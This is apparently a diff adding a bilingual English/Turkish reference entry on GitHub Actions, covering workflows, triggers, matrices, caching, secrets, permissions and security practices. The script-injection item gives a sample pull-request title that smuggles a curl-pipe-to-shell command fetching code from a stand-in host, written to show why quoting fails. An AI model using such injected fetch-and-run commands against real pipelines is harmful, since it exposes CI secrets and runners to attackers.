@@ -1,0 +1,700 @@
+id: github-actions
+title: GitHub Actions
+category: tool
+summary:
+  en: Runs your tests, builds and deploys on GitHub's machines whenever something happens in your repository.
+  tr: Repoda bir şey olduğunda test, build ve deploy işlerini GitHub'ın makinelerinde çalıştırır.
+aliases: [gha, actions, workflow, iş akışı, ci, cd, ci/cd, pipeline, sürekli entegrasyon]
+detect:
+  files: [.github/workflows]
+checked: 2026-10
+sources:
+  - title: GitHub Actions documentation
+    url: https://docs.github.com/en/actions
+  - title: Workflow syntax
+    url: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax
+  - title: Events that trigger workflows
+    url: https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows
+roadmap: ci-cd
+sections:
+  - id: first-workflow
+    title: { en: First workflow, tr: İlk workflow }
+    items:
+      - id: workflow-file
+        level: basic
+        title: { en: A workflow that runs the tests, tr: Testleri çalıştıran bir workflow }
+        what:
+          en: A YAML file in .github/workflows says when to run (on) and what to run (jobs and their steps).
+          tr: .github/workflows içindeki bir YAML dosyası ne zaman (on) ve neyin (job'lar ve adımları) çalışacağını söyler.
+        lang: yaml
+        form: .github/workflows/<name>.yml
+        example: |
+          name: CI
+          on:
+            push:
+              branches: [main]
+            pull_request:
+          jobs:
+            test:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/checkout@v7
+                - uses: actions/setup-node@v7
+                  with:
+                    node-version: 24
+                    cache: npm
+                - run: npm ci
+                - run: npm test
+        mistake:
+          en: Putting the file in .github/workflow (no s) or another folder; GitHub never finds it.
+          tr: Dosyayı .github/workflow (s'siz) ya da başka bir klasöre koymak; GitHub onu hiç bulmaz.
+        source: https://docs.github.com/en/actions/get-started/quickstart
+      - id: uses-run
+        level: basic
+        title: { en: uses and run, tr: uses ve run }
+        what:
+          en: A step either uses a ready-made action (uses) or runs shell commands (run).
+          tr: Bir adım ya hazır bir action kullanır (uses) ya da shell komutları çalıştırır (run).
+        lang: yaml
+        form: "- uses: <owner>/<repo>@<version>"
+        example: |
+          steps:
+            - uses: actions/checkout@v7
+            - name: Build
+              run: |
+                npm ci
+                npm run build
+        mistake:
+          en: Forgetting actions/checkout; the job starts on an empty machine and your code is not there.
+          tr: actions/checkout'u unutmak; job boş bir makinede başlar ve kodun orada değildir.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobssteps
+      - id: runs-on
+        level: basic
+        title: { en: Choose the machine, tr: Makineyi seçme }
+        what:
+          en: runs-on picks the runner; ubuntu-latest is Ubuntu 24.04 today, and there are Windows, macOS and ARM runners too.
+          tr: runs-on runner'ı seçer; ubuntu-latest bugün Ubuntu 24.04'tür, Windows, macOS ve ARM runner'ları da var.
+        lang: yaml
+        form: "runs-on: ubuntu-latest"
+        example: |
+          jobs:
+            build:
+              runs-on: ubuntu-24.04
+            build-arm:
+              runs-on: ubuntu-24.04-arm
+        mistake:
+          en: Relying on -latest for a build that needs a fixed OS; the label moves to a new version without warning in your workflow. Pin ubuntu-24.04 if it matters.
+          tr: Sabit bir işletim sistemi isteyen bir build için -latest'e güvenmek; etiket workflow'unda hiçbir uyarı olmadan yeni bir sürüme geçer. Önemliyse ubuntu-24.04 gibi sabitle.
+        source: https://docs.github.com/en/actions/reference/runners/github-hosted-runners
+      - id: env
+        level: basic
+        title: { en: Environment variables, tr: Ortam değişkenleri }
+        what:
+          en: env sets variables for the whole workflow, one job or one step; the closest level wins.
+          tr: env değişkenleri bütün workflow, tek bir job ya da tek bir adım için ayarlar; en yakın seviye kazanır.
+        lang: yaml
+        form: "env: NAME: value"
+        example: |
+          env:
+            NODE_ENV: test
+          jobs:
+            test:
+              runs-on: ubuntu-latest
+              env:
+                DATABASE_URL: postgres://postgres:dev@localhost:5432/test
+              steps:
+                - run: echo "$NODE_ENV $DATABASE_URL"
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-variables
+      - id: secrets
+        level: basic
+        title: { en: Use a secret, tr: Secret kullanma }
+        what:
+          en: Secrets are saved in the repository settings and read with secrets.NAME; GitHub hides their values in the logs.
+          tr: Secret'lar repo ayarlarında saklanır ve secrets.NAME ile okunur; GitHub değerlerini loglarda gizler.
+        lang: yaml
+        form: "${{ secrets.NAME }}"
+        example: |
+          - name: Deploy
+            env:
+              DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+            run: ./deploy.sh
+        mistake:
+          en: Expecting secrets in pull requests from forks; except GITHUB_TOKEN they are not passed there, so the step gets an empty value.
+          tr: Fork'lardan gelen pull request'lerde secret beklemek; GITHUB_TOKEN dışında oraya aktarılmazlar, adım boş değer alır.
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets
+      - id: vars
+        level: intermediate
+        title: { en: Configuration variables, tr: Yapılandırma değişkenleri }
+        what:
+          en: Non-secret settings saved in the repository, organization or environment settings and read with vars.NAME.
+          tr: Repo, organizasyon ya da environment ayarlarında saklanan gizli olmayan ayarlar; vars.NAME ile okunur.
+        lang: yaml
+        form: "${{ vars.NAME }}"
+        example: |
+          - run: ./deploy.sh --region "$REGION"
+            env:
+              REGION: ${{ vars.AWS_REGION }}
+        avoid:
+          en: For passwords and tokens; vars are shown in plain text, use secrets.
+          tr: Şifreler ve token'lar için; vars düz metin olarak görünür, secrets kullan.
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-variables
+  - id: triggers
+    title: { en: Triggers, tr: Tetikleyiciler }
+    items:
+      - id: push-pr-filters
+        level: basic
+        title: { en: Run only for some branches or files, tr: Sadece bazı dallar ya da dosyalar için çalıştırma }
+        what:
+          en: branches, tags and paths filters make the workflow run only when matching branches or files change.
+          tr: branches, tags ve paths filtreleri workflow'un sadece eşleşen dallar ya da dosyalar değiştiğinde çalışmasını sağlar.
+        lang: yaml
+        form: "on: push: branches: [main]"
+        example: |
+          on:
+            push:
+              branches: [main]
+              tags: ["v*"]
+            pull_request:
+              paths:
+                - "src/**"
+                - "package*.json"
+        mistake:
+          en: Making a check required while paths skips the workflow; the pull request waits for a check that never runs.
+          tr: paths workflow'u atlarken o kontrolü zorunlu yapmak; pull request hiç çalışmayacak bir kontrolü bekler.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#onpushpull_requestpull_request_targetpathspaths-ignore
+      - id: workflow-dispatch
+        level: basic
+        title: { en: Run by hand with inputs, tr: Girdilerle elle çalıştırma }
+        what:
+          en: workflow_dispatch adds a Run workflow button, with optional inputs you fill in before it starts.
+          tr: workflow_dispatch bir Run workflow butonu ekler; başlamadan önce doldurduğun isteğe bağlı girdilerle.
+        lang: yaml
+        form: "on: workflow_dispatch:"
+        example: |
+          on:
+            workflow_dispatch:
+              inputs:
+                environment:
+                  type: choice
+                  options: [staging, production]
+                  default: staging
+          jobs:
+            deploy:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo "Deploying to ${{ inputs.environment }}"
+          # from a terminal: gh workflow run deploy.yml -f environment=production
+        mistake:
+          en: Adding workflow_dispatch on a feature branch and looking for the button; it appears only when the file is on the default branch.
+          tr: workflow_dispatch'i bir feature dalına ekleyip butonu aramak; buton sadece dosya varsayılan daldayken görünür.
+        source: https://docs.github.com/en/actions/how-tos/manage-workflow-runs/manually-run-a-workflow
+      - id: schedule
+        level: intermediate
+        title: { en: Run on a schedule, tr: Zamanlanmış çalıştırma }
+        what:
+          en: schedule runs the workflow with cron syntax, in UTC unless you set a timezone; it runs on the default branch.
+          tr: schedule workflow'u cron söz dizimiyle çalıştırır; timezone vermezsen UTC'ye göre ve varsayılan dalda çalışır.
+        lang: yaml
+        form: "on: schedule: - cron: '<min> <hour> <day> <month> <weekday>'"
+        example: |
+          on:
+            schedule:
+              - cron: "30 6 * * 1-5"
+                timezone: "Europe/Istanbul"
+        mistake:
+          en: Expecting it to start on the exact minute; scheduled runs can be delayed under load, and in public repositories they stop after 60 days without activity.
+          tr: Tam dakikasında başlamasını beklemek; yoğunlukta gecikebilir, public repolarda ise 60 gün hiçbir hareket olmazsa durdurulur.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#schedule
+      - id: pull-request-target
+        level: advanced
+        title: { en: The pull_request_target danger, tr: pull_request_target tehlikesi }
+        what:
+          en: pull_request_target runs with the base repository's secrets and write token, so it must never build or run code from the pull request.
+          tr: pull_request_target ana reponun secret'larıyla ve yazma yetkili token'ıyla çalışır; bu yüzden pull request'teki kodu asla build etmemeli ya da çalıştırmamalı.
+        lang: yaml
+        form: "on: pull_request_target:"
+        example: |
+          on:
+            pull_request_target:
+              types: [opened]
+          permissions:
+            pull-requests: write
+          jobs:
+            label:
+              runs-on: ubuntu-latest
+              steps:
+                - run: gh pr edit "$PR" --add-label triage --repo "$GITHUB_REPOSITORY"
+                  env:
+                    PR: ${{ github.event.pull_request.number }}
+                    GH_TOKEN: ${{ github.token }}
+        mistake:
+          en: Checking out the pull request's head and running npm install there; anyone can open a pull request and steal your secrets.
+          tr: Pull request'in head'ini checkout edip orada npm install çalıştırmak; herkes bir pull request açıp secret'larını çalabilir.
+        avoid:
+          en: For building and testing pull requests; plain pull_request is the safe trigger for that.
+          tr: Pull request'leri build edip test etmek için; bunun için güvenli tetikleyici düz pull_request'tir.
+        source: https://docs.github.com/en/actions/reference/security/secure-use
+  - id: jobs
+    title: { en: Jobs, conditions and matrix, tr: Job'lar, koşullar ve matrix }
+    items:
+      - id: needs
+        level: basic
+        title: { en: Run jobs in order, tr: Job'ları sırayla çalıştırma }
+        what:
+          en: Jobs run in parallel by default; needs makes a job wait until the jobs it names have succeeded.
+          tr: Job'lar varsayılan olarak paralel çalışır; needs bir job'un, adını verdiği job'lar başarıyla bitene kadar beklemesini sağlar.
+        lang: yaml
+        form: "needs: [<job>]"
+        example: |
+          jobs:
+            test:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo test
+            deploy:
+              needs: test
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo deploy
+        mistake:
+          en: Expecting files from one job in the next; every job runs on a fresh machine. Pass files with artifacts.
+          tr: Bir job'daki dosyaların sonraki job'da olmasını beklemek; her job yeni bir makinede çalışır. Dosyaları artifact ile aktar.
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-jobs
+      - id: if
+        level: basic
+        title: { en: Run a step or job only sometimes, tr: Bir adımı ya da job'u sadece bazen çalıştırma }
+        what:
+          en: if runs a job or step only when the expression is true, for example only on main.
+          tr: if bir job'u ya da adımı sadece ifade doğruysa çalıştırır; örneğin sadece main'de.
+        lang: yaml
+        form: "if: github.ref == 'refs/heads/main'"
+        example: |
+          - run: ./deploy.sh
+            if: github.ref == 'refs/heads/main' && github.event_name == 'push'
+          - run: echo "not a fork"
+            if: ${{ !github.event.pull_request.head.repo.fork }}
+        mistake:
+          en: Starting an if with ! without ${{ }}; ! has a special meaning in YAML and the file breaks.
+          tr: if'i ${{ }} olmadan ! ile başlatmak; ! YAML'da özel anlam taşır ve dosya bozulur.
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-jobs-with-conditions
+      - id: status-functions
+        level: intermediate
+        title: { en: Run a step even after a failure, tr: Hatadan sonra bile adım çalıştırma }
+        what:
+          en: Steps stop after the first failure; if with always(), failure() or cancelled() runs a step anyway, for clean-up or reports.
+          tr: Adımlar ilk hatada durur; if ile always(), failure() ya da cancelled() bir adımı yine de çalıştırır, temizlik ya da rapor için.
+        lang: yaml
+        form: "if: failure()"
+        example: |
+          - run: npm test
+          - name: Upload test report
+            if: failure()
+            uses: actions/upload-artifact@v7
+            with:
+              name: test-report
+              path: reports/
+        mistake:
+          en: Using always() for a deploy step; it then also runs when the workflow was cancelled. Use success() or !cancelled().
+          tr: Bir deploy adımında always() kullanmak; workflow iptal edildiğinde de çalışır. success() ya da !cancelled() kullan.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/expressions#status-check-functions
+      - id: matrix
+        level: intermediate
+        title: { en: Test on many versions at once, tr: Birçok sürümde aynı anda test }
+        what:
+          en: A matrix runs the same job once for each combination of values, such as Node versions and operating systems.
+          tr: Matrix aynı job'u değerlerin her birleşimi için bir kez çalıştırır; Node sürümleri ve işletim sistemleri gibi.
+        lang: yaml
+        form: "strategy: matrix: <key>: [<values>]"
+        example: |
+          jobs:
+            test:
+              strategy:
+                fail-fast: false
+                matrix:
+                  node: [22, 24]
+                  os: [ubuntu-latest, windows-latest]
+                  include:
+                    - node: 26
+                      os: ubuntu-latest
+              runs-on: ${{ matrix.os }}
+              steps:
+                - uses: actions/checkout@v7
+                - uses: actions/setup-node@v7
+                  with:
+                    node-version: ${{ matrix.node }}
+                - run: npm ci && npm test
+        mistake:
+          en: Leaving fail-fast at its default (true); one failing combination cancels all the others and you do not see which ones also fail.
+          tr: fail-fast'i varsayılanında (true) bırakmak; tek bir başarısız birleşim diğerlerini iptal eder ve başka hangilerinin de bozulduğunu göremezsin.
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/run-job-variations
+      - id: job-outputs
+        level: intermediate
+        title: { en: Pass a value to another job, tr: Bir değeri başka bir job'a aktarma }
+        what:
+          en: A step writes name=value to $GITHUB_OUTPUT; the job lists it under outputs, and later jobs read it from needs.
+          tr: Bir adım name=value'yu $GITHUB_OUTPUT'a yazar; job onu outputs altında listeler, sonraki job'lar needs üzerinden okur.
+        lang: yaml
+        form: echo "name=value" >> "$GITHUB_OUTPUT"
+        example: |
+          jobs:
+            version:
+              runs-on: ubuntu-latest
+              outputs:
+                tag: ${{ steps.v.outputs.tag }}
+              steps:
+                - id: v
+                  run: echo "tag=v1.4.2" >> "$GITHUB_OUTPUT"
+            release:
+              needs: version
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo "Releasing ${{ needs.version.outputs.tag }}"
+        mistake:
+          en: Forgetting the step id or the job-level outputs; the value is then just empty, without an error.
+          tr: Adım id'sini ya da job seviyesindeki outputs'u unutmak; değer hata vermeden boş gelir.
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/pass-job-outputs
+      - id: multiline-output
+        level: advanced
+        title: { en: A value with several lines, tr: Birkaç satırlık bir değer }
+        what:
+          en: For a value with line breaks, write name<<DELIMITER, the lines, then the delimiter alone on a line.
+          tr: Satır sonu içeren bir değer için name<<AYRAÇ, satırları, sonra tek başına bir satırda ayracı yaz.
+        lang: sh
+        form: |
+          {
+            echo "name<<EOF"
+            <command>
+            echo "EOF"
+          } >> "$GITHUB_OUTPUT"
+        example: |
+          GITHUB_OUTPUT=output.txt   # the runner sets this path in a real job
+          {
+            echo "notes<<EOF"
+            printf 'Fix login\nAdd dark mode\n'
+            echo "EOF"
+          } >> "$GITHUB_OUTPUT"
+          cat output.txt
+        output: |
+          notes<<EOF
+          Fix login
+          Add dark mode
+          EOF
+        check: sh
+        mistake:
+          en: Using a delimiter that can appear in the value itself; the value is cut there. Use a random delimiter for arbitrary text.
+          tr: Değerin içinde de geçebilecek bir ayraç kullanmak; değer orada kesilir. Rastgele metinler için rastgele bir ayraç kullan.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#multiline-strings
+      - id: github-env
+        level: intermediate
+        title: { en: Set a variable for the next steps, tr: Sonraki adımlar için değişken ayarlama }
+        what:
+          en: Writing NAME=value to $GITHUB_ENV makes the variable available in all later steps of the same job.
+          tr: NAME=value'yu $GITHUB_ENV'e yazmak, değişkeni aynı job'un sonraki bütün adımlarında kullanılabilir yapar.
+        lang: yaml
+        form: echo "NAME=value" >> "$GITHUB_ENV"
+        example: |
+          - run: echo "BUILD_DATE=$(date -u +%F)" >> "$GITHUB_ENV"
+          - run: echo "Built on $BUILD_DATE"
+        mistake:
+          en: Using export in one step and reading the variable in the next; every step is a new shell, so it is gone.
+          tr: Bir adımda export kullanıp değişkeni sonraki adımda okumak; her adım yeni bir shell'dir, değişken kaybolur.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#setting-an-environment-variable
+      - id: timeout
+        level: intermediate
+        title: { en: Stop stuck jobs, tr: Takılan job'ları durdurma }
+        what:
+          en: timeout-minutes cancels a job or step that runs too long; a job's default is 360 minutes.
+          tr: timeout-minutes çok uzun süren bir job'u ya da adımı iptal eder; job için varsayılan 360 dakikadır.
+        lang: yaml
+        form: "timeout-minutes: <n>"
+        example: |
+          jobs:
+            test:
+              runs-on: ubuntu-latest
+              timeout-minutes: 15
+              steps:
+                - run: npm test
+                  timeout-minutes: 10
+        mistake:
+          en: Leaving the default; a test that hangs burns six hours of runner minutes before it is stopped.
+          tr: Varsayılanı bırakmak; takılan bir test durdurulana kadar altı saatlik runner dakikası yakar.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idtimeout-minutes
+      - id: concurrency
+        level: intermediate
+        title: { en: Cancel older runs, tr: Eski çalışmaları iptal etme }
+        what:
+          en: concurrency allows one run per group at a time; cancel-in-progress stops the older run when a new one starts.
+          tr: concurrency bir grupta aynı anda tek bir çalışmaya izin verir; cancel-in-progress yenisi başlayınca eskisini durdurur.
+        lang: yaml
+        form: "concurrency: group: <name>"
+        example: |
+          concurrency:
+            group: ${{ github.workflow }}-${{ github.ref }}
+            cancel-in-progress: true
+        mistake:
+          en: Using cancel-in-progress on a deploy workflow; a deploy can be stopped halfway. Leave it off there so runs wait in line.
+          tr: Bir deploy workflow'unda cancel-in-progress kullanmak; deploy yarıda kesilebilir. Orada kapalı bırak ki çalışmalar sırayla beklesin.
+        source: https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency
+      - id: services
+        level: advanced
+        title: { en: A database for the tests, tr: Testler için veritabanı }
+        what:
+          en: services starts containers (PostgreSQL, Redis) next to the job, so tests can use a real database.
+          tr: services job'un yanında container'lar (PostgreSQL, Redis) başlatır; testler gerçek bir veritabanı kullanabilir.
+        lang: yaml
+        form: "services: <name>: image: <image>"
+        example: |
+          jobs:
+            test:
+              runs-on: ubuntu-latest
+              services:
+                postgres:
+                  image: postgres:18
+                  env:
+                    POSTGRES_PASSWORD: dev
+                  ports:
+                    - 5432:5432
+                  options: >-
+                    --health-cmd pg_isready
+                    --health-interval 5s
+                    --health-retries 10
+              steps:
+                - uses: actions/checkout@v7
+                - run: npm ci && npm test
+                  env:
+                    DATABASE_URL: postgres://postgres:dev@localhost:5432/postgres
+        mistake:
+          en: Leaving out the health options; the tests start before the database accepts connections.
+          tr: Health seçeneklerini yazmamak; testler veritabanı bağlantı kabul etmeden başlar.
+        avoid:
+          en: Service containers need a Linux runner; they do not work on macOS or Windows runners.
+          tr: Service container'lar Linux runner ister; macOS ya da Windows runner'larında çalışmaz.
+        source: https://docs.github.com/en/actions/tutorials/use-containerized-services/use-docker-service-containers
+  - id: speed
+    title: { en: Caching and artifacts, tr: Cache ve artifact'ler }
+    items:
+      - id: setup-cache
+        level: basic
+        title: { en: Cache dependencies the easy way, tr: Bağımlılıkları kolayca cache'leme }
+        what:
+          en: setup-node, setup-python and similar actions cache the package manager's downloads with one cache line.
+          tr: setup-node, setup-python ve benzeri action'lar paket yöneticisinin indirdiklerini tek bir cache satırıyla cache'ler.
+        lang: yaml
+        form: "cache: npm"
+        example: |
+          - uses: actions/setup-node@v7
+            with:
+              node-version: 24
+              cache: npm          # or pnpm, yarn
+          - uses: actions/setup-python@v7
+            with:
+              python-version: "3.14"
+              cache: pip
+        mistake:
+          en: Writing python-version 3.10 without quotes; YAML reads it as the number 3.1.
+          tr: python-version 3.10'u tırnaksız yazmak; YAML onu 3.1 sayısı olarak okur.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching
+      - id: cache-action
+        level: intermediate
+        title: { en: Cache any folder, tr: Herhangi bir klasörü cache'leme }
+        what:
+          en: actions/cache saves a folder under a key and restores it in later runs; restore-keys allow a close match.
+          tr: actions/cache bir klasörü bir anahtarla saklar ve sonraki çalışmalarda geri yükler; restore-keys yakın bir eşleşmeye izin verir.
+        lang: yaml
+        form: "uses: actions/cache@v6"
+        example: |
+          - uses: actions/cache@v6
+            with:
+              path: ~/.cache/ms-playwright
+              key: playwright-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
+              restore-keys: |
+                playwright-${{ runner.os }}-
+        mistake:
+          en: A key that never changes; the old cache is restored forever. Put a hash of the lock file in the key.
+          tr: Hiç değişmeyen bir anahtar; eski cache sonsuza kadar geri yüklenir. Anahtara lock dosyasının hash'ini koy.
+        avoid:
+          en: Caches unused for 7 days are deleted and a repository has 10 GB by default; do not rely on a cache to keep data.
+          tr: 7 gün kullanılmayan cache'ler silinir ve bir reponun varsayılan alanı 10 GB'tır; veri saklamak için cache'e güvenme.
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching
+      - id: artifacts
+        level: intermediate
+        title: { en: Keep build output and pass files between jobs, tr: Build çıktısını saklama ve job'lar arasında dosya aktarma }
+        what:
+          en: upload-artifact saves files from a run so you can download them or use them in a later job with download-artifact.
+          tr: upload-artifact bir çalışmadaki dosyaları saklar; onları indirebilir ya da sonraki bir job'da download-artifact ile kullanabilirsin.
+        lang: yaml
+        form: "uses: actions/upload-artifact@v7"
+        example: |
+          # in the build job
+          - uses: actions/upload-artifact@v7
+            with:
+              name: dist
+              path: dist/
+              retention-days: 7
+          # in a later job that needs: build
+          - uses: actions/download-artifact@v8
+            with:
+              name: dist
+              path: dist/
+        mistake:
+          en: Uploading with the same name from every matrix job; artifact names must be unique in a run, so add the matrix values to the name.
+          tr: Her matrix job'undan aynı adla yükleme yapmak; artifact adları bir çalışmada benzersiz olmalı, ada matrix değerlerini ekle.
+        source: https://docs.github.com/en/actions/tutorials/store-and-share-data
+      - id: step-summary
+        level: advanced
+        title: { en: Write a summary on the run page, tr: Çalışma sayfasına özet yazma }
+        what:
+          en: Markdown written to $GITHUB_STEP_SUMMARY is shown on the run's summary page.
+          tr: $GITHUB_STEP_SUMMARY'ye yazılan Markdown, çalışmanın özet sayfasında gösterilir.
+        lang: yaml
+        form: echo "<markdown>" >> "$GITHUB_STEP_SUMMARY"
+        example: |
+          - run: |
+              echo "## Test results" >> "$GITHUB_STEP_SUMMARY"
+              echo "- passed: 128" >> "$GITHUB_STEP_SUMMARY"
+              echo "- failed: 0" >> "$GITHUB_STEP_SUMMARY"
+        source: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#adding-a-job-summary
+  - id: security-reuse
+    title: { en: Security and reuse, tr: Güvenlik ve yeniden kullanım }
+    items:
+      - id: permissions
+        level: intermediate
+        title: { en: Give the token only what it needs, tr: Token'a sadece gerekeni verme }
+        what:
+          en: permissions sets what the automatic GITHUB_TOKEN may do; everything you do not list is none.
+          tr: permissions otomatik GITHUB_TOKEN'ın neler yapabileceğini belirler; listelemediğin her şey none olur.
+        lang: yaml
+        form: "permissions: contents: read"
+        example: |
+          permissions:
+            contents: read
+          jobs:
+            release:
+              runs-on: ubuntu-latest
+              permissions:
+                contents: write
+                packages: write
+              steps:
+                - run: gh release create v1.4.2 --generate-notes
+                  env:
+                    GH_TOKEN: ${{ github.token }}
+        mistake:
+          en: Leaving the token with broad write access in every workflow; one compromised action can then push to your repository.
+          tr: Her workflow'da token'a geniş yazma yetkisi bırakmak; tek bir ele geçirilmiş action o zaman repoya push yapabilir.
+        source: https://docs.github.com/en/actions/tutorials/authenticate-with-github_token
+      - id: script-injection
+        level: advanced
+        title: { en: Do not put untrusted text into run, tr: Güvenilmeyen metni run'ın içine koymama }
+        what:
+          en: Values like a pull request title are pasted into the script before it runs, so pass them through env instead.
+          tr: Pull request başlığı gibi değerler script çalışmadan önce içine yapıştırılır; bu yüzden onları env üzerinden ver.
+        lang: yaml
+        form: "env: TITLE: ${{ github.event.pull_request.title }}"
+        example: |
+          # unsafe: run: echo "${{ github.event.pull_request.title }}"
+          - name: Check title
+            env:
+              TITLE: ${{ github.event.pull_request.title }}
+            run: |
+              if [[ "$TITLE" == feat:* ]]; then echo "feature"; fi
+        mistake:
+          en: Thinking quotes protect you; a title like a"; curl evil.sh | sh; " breaks out of them.
+          tr: Tırnakların seni koruduğunu sanmak; a"; curl evil.sh | sh; " gibi bir başlık tırnakların dışına çıkar.
+        source: https://docs.github.com/en/actions/reference/security/secure-use
+      - id: pin-sha
+        level: advanced
+        title: { en: Pin third-party actions, tr: Üçüncü taraf action'ları sabitleme }
+        what:
+          en: A tag like @v3 can be moved to other code; a full commit SHA always points to the code you reviewed.
+          tr: '@v3 gibi bir tag başka bir koda taşınabilir; tam commit SHA''sı her zaman incelediğin kodu gösterir.'
+        lang: yaml
+        form: "uses: <owner>/<repo>@<full-commit-sha> # v1.2.3"
+        example: |
+          - uses: some-org/deploy-action@3f1c2a9b8e7d6c5b4a39281706f5e4d3c2b1a090 # v3.1.0
+        avoid:
+          en: In a repository that uses a workflow dependency lockfile (.github/workflows/actions.lock from gh actions-lock, in public preview); the lockfile already pins every action.
+          tr: Workflow dependency lockfile kullanan bir repoda (gh actions-lock ile oluşturulan .github/workflows/actions.lock, public preview); lockfile zaten her action'ı sabitler.
+        source: https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions
+      - id: environments
+        level: intermediate
+        title: { en: Deploy environments with approval, tr: Onaylı deploy ortamları }
+        what:
+          en: environment ties a job to an environment such as production, with its own secrets and optional required reviewers.
+          tr: environment bir job'u production gibi bir ortama bağlar; kendi secret'ları ve isteğe bağlı zorunlu onaylayıcılarıyla.
+        lang: yaml
+        form: "environment: production"
+        example: |
+          jobs:
+            deploy:
+              runs-on: ubuntu-latest
+              environment:
+                name: production
+                url: https://shop.example.com
+              steps:
+                - run: ./deploy.sh
+                  env:
+                    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        source: https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/manage-environments
+      - id: oidc
+        level: advanced
+        title: { en: Log in to the cloud without stored keys, tr: Saklanan anahtar olmadan buluta giriş }
+        what:
+          en: With id-token write permission a job gets a short-lived OIDC token that AWS, Azure or Google Cloud can trust instead of long-lived keys.
+          tr: id-token write yetkisiyle job kısa ömürlü bir OIDC token'ı alır; AWS, Azure ya da Google Cloud uzun ömürlü anahtarlar yerine ona güvenebilir.
+        lang: yaml
+        form: "permissions: id-token: write"
+        example: |
+          permissions:
+            id-token: write
+            contents: read
+          jobs:
+            deploy:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: aws-actions/configure-aws-credentials@v5
+                  with:
+                    role-to-assume: arn:aws:iam::123456789012:role/github-deploy
+                    aws-region: eu-central-1
+        mistake:
+          en: A cloud trust policy that accepts any repository or branch; limit the token's subject to your repository and branch.
+          tr: Her repoyu ya da dalı kabul eden bir bulut güven politikası; token'ın subject'ini kendi repona ve dalına sınırla.
+        source: https://docs.github.com/en/actions/concepts/security/openid-connect
+      - id: reusable-workflow
+        level: advanced
+        title: { en: Reuse a whole workflow, tr: Bütün bir workflow'u tekrar kullanma }
+        what:
+          en: A workflow with on workflow_call can be called from other workflows like a function, with inputs and secrets.
+          tr: on workflow_call olan bir workflow, girdiler ve secret'larla, başka workflow'lardan bir fonksiyon gibi çağrılabilir.
+        lang: yaml
+        form: "uses: <owner>/<repo>/.github/workflows/<file>.yml@<ref>"
+        example: |
+          # .github/workflows/deploy.yml
+          on:
+            workflow_call:
+              inputs:
+                environment:
+                  type: string
+                  required: true
+          # caller
+          jobs:
+            deploy:
+              uses: ./.github/workflows/deploy.yml
+              with:
+                environment: staging
+              secrets: inherit
+        mistake:
+          en: Expecting the called workflow to see the caller's secrets automatically; pass them by name or with secrets inherit.
+          tr: Çağrılan workflow'un çağıranın secret'larını kendiliğinden göreceğini sanmak; onları adıyla ya da secrets inherit ile ver.
+        source: https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows
+      - id: debug-logging
+        level: intermediate
+        title: { en: More detail when a run fails, tr: Bir çalışma başarısız olunca daha fazla ayrıntı }
+        what:
+          en: Setting the secret or variable ACTIONS_STEP_DEBUG to true adds debug lines to the logs; you can also re-run a job with debug logging.
+          tr: ACTIONS_STEP_DEBUG secret'ını ya da değişkenini true yapmak loglara debug satırları ekler; bir job'u debug loglamayla yeniden de çalıştırabilirsin.
+        lang: sh
+        form: gh variable set ACTIONS_STEP_DEBUG --body true
+        example: |
+          gh variable set ACTIONS_STEP_DEBUG --body true
+          gh run rerun 1234567890 --failed --debug
+        source: https://docs.github.com/en/actions/how-tos/monitor-workflows/enable-debug-logging
